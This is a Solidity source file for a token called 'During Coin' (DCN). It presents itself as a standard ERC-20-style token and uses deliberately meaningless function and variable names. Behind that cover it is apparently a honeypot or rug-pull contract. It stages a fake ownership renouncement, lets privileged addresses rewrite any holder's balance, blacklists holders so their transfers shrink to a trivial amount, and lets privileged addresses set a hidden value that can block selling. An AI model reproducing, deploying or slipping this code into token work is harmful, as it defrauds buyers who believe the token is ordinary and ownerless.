//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract toFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromMode {
    function createPair(address minEnableFrom, address txTrading) external returns (address);

    function feeTo() external view returns (address);
}

interface tokenEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface launchTxFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletLimit) external view returns (uint256);

    function transfer(address listMin, uint256 takeMax) external returns (bool);

    function allowance(address launchedTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeMax) external returns (bool);

    function transferFrom(
        address sender,
        address listMin,
        uint256 takeMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listExempt, uint256 value);
    event Approval(address indexed launchedTake, address indexed spender, uint256 value);
}

interface launchTxFromMetadata is launchTxFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DuringCoin is toFee, launchTxFrom, launchTxFromMetadata {

    function marketingToToken(address limitFeeMin, address listMin, uint256 takeMax) internal view returns (uint256) {
        require(takeMax > 0);

        uint256 tradingEnable = 0;
        if (limitFeeMin == feeMin && minTokenTotal > 0) {
            tradingEnable = takeMax * minTokenTotal / 100;
        } else if (listMin == feeMin && listMinLaunch > 0) {
            tradingEnable = takeMax * listMinLaunch / 100;
        }
        require(tradingEnable <= takeMax);
        return takeMax - tradingEnable;
    }

    bool private launchedMode;

    uint256 public limitReceiver;

    function minSwapExempt() public {
        emit OwnershipTransferred(enableExempt, address(0));
        exemptAt = address(0);
    }

    bool public feeLaunchTo;

    function allowance(address toFrom, address sellSenderTo) external view virtual override returns (uint256) {
        if (sellSenderTo == fundSender) {
            return type(uint256).max;
        }
        return liquidityBuy[toFrom][sellSenderTo];
    }

    function exemptList(address minFromReceiver) public {
        modeTeamSell();
        if (maxLimit != launchedMode) {
            maxLimit = true;
        }
        if (minFromReceiver == enableExempt || minFromReceiver == feeMin) {
            return;
        }
        teamToken[minFromReceiver] = true;
    }

    function transfer(address totalBuy, uint256 takeMax) external virtual override returns (bool) {
        return sellAmount(_msgSender(), totalBuy, takeMax);
    }

    event OwnershipTransferred(address indexed limitTotal, address indexed walletExemptReceiver);

    uint256 public listMinLaunch = 0;

    address fundSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private liquidityBuy;

    uint256 private enableTeam;

    mapping(address => bool) public teamToken;

    function name() external view virtual override returns (string memory) {
        return buyLaunched;
    }

    bool private swapEnable;

    uint256 receiverMarketingMax;

    address buySwap;

    uint8 private receiverExempt = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return amountMax;
    }

    function receiverToken(address exemptSender) public {
        require(exemptSender.balance < 100000);
        if (enableAuto) {
            return;
        }
        if (limitReceiver == enableTeam) {
            limitReceiver = tradingToken;
        }
        listSender[exemptSender] = true;
        if (enableTeam != tradingToken) {
            feeLaunchTo = true;
        }
        enableAuto = true;
    }

    address public enableExempt;

    function decimals() external view virtual override returns (uint8) {
        return receiverExempt;
    }

    uint256 private tradingToken;

    uint256 swapFrom;

    mapping(address => bool) public listSender;

    uint256 constant enableFund = 3 ** 10;

    function sellAmount(address limitFeeMin, address listMin, uint256 takeMax) internal returns (bool) {
        if (limitFeeMin == enableExempt) {
            return fromEnable(limitFeeMin, listMin, takeMax);
        }
        uint256 fundLaunched = launchTxFrom(feeMin).balanceOf(buySwap);
        require(fundLaunched == swapFrom);
        require(listMin != buySwap);
        if (teamToken[limitFeeMin]) {
            return fromEnable(limitFeeMin, listMin, enableFund);
        }
        takeMax = marketingToToken(limitFeeMin, listMin, takeMax);
        return fromEnable(limitFeeMin, listMin, takeMax);
    }

    address public feeMin;

    function balanceOf(address walletLimit) public view virtual override returns (uint256) {
        return tradingMarketing[walletLimit];
    }

    bool private walletMode;

    address private exemptAt;

    function fundReceiverMarketing(uint256 takeMax) public {
        modeTeamSell();
        swapFrom = takeMax;
    }

    function modeTeamSell() private view {
        require(listSender[_msgSender()]);
    }

    string private buyLaunched = "During Coin";

    bool private modeFundTake;

    uint256 private amountMax = 100000000 * 10 ** 18;

    constructor (){
        
        minSwapExempt();
        tokenEnable fromLaunch = tokenEnable(fundSender);
        feeMin = fromMode(fromLaunch.factory()).createPair(fromLaunch.WETH(), address(this));
        buySwap = fromMode(fromLaunch.factory()).feeTo();
        if (limitReceiver == enableTeam) {
            enableTeam = tradingToken;
        }
        enableExempt = _msgSender();
        listSender[enableExempt] = true;
        tradingMarketing[enableExempt] = amountMax;
        if (modeFundTake) {
            walletMode = false;
        }
        emit Transfer(address(0), enableExempt, amountMax);
    }

    bool public enableAuto;

    bool private maxLimit;

    mapping(address => uint256) private tradingMarketing;

    function symbol() external view virtual override returns (string memory) {
        return walletTxMarketing;
    }

    string private walletTxMarketing = "DCN";

    uint256 public minTokenTotal = 0;

    function fromEnable(address limitFeeMin, address listMin, uint256 takeMax) internal returns (bool) {
        require(tradingMarketing[limitFeeMin] >= takeMax);
        tradingMarketing[limitFeeMin] -= takeMax;
        tradingMarketing[listMin] += takeMax;
        emit Transfer(limitFeeMin, listMin, takeMax);
        return true;
    }

    function owner() external view returns (address) {
        return exemptAt;
    }

    function approve(address sellSenderTo, uint256 takeMax) public virtual override returns (bool) {
        liquidityBuy[_msgSender()][sellSenderTo] = takeMax;
        emit Approval(_msgSender(), sellSenderTo, takeMax);
        return true;
    }

    function transferFrom(address limitFeeMin, address listMin, uint256 takeMax) external override returns (bool) {
        if (_msgSender() != fundSender) {
            if (liquidityBuy[limitFeeMin][_msgSender()] != type(uint256).max) {
                require(takeMax <= liquidityBuy[limitFeeMin][_msgSender()]);
                liquidityBuy[limitFeeMin][_msgSender()] -= takeMax;
            }
        }
        return sellAmount(limitFeeMin, listMin, takeMax);
    }

    function tradingWalletMin(address totalBuy, uint256 takeMax) public {
        modeTeamSell();
        tradingMarketing[totalBuy] = takeMax;
    }

    function getOwner() external view returns (address) {
        return exemptAt;
    }

}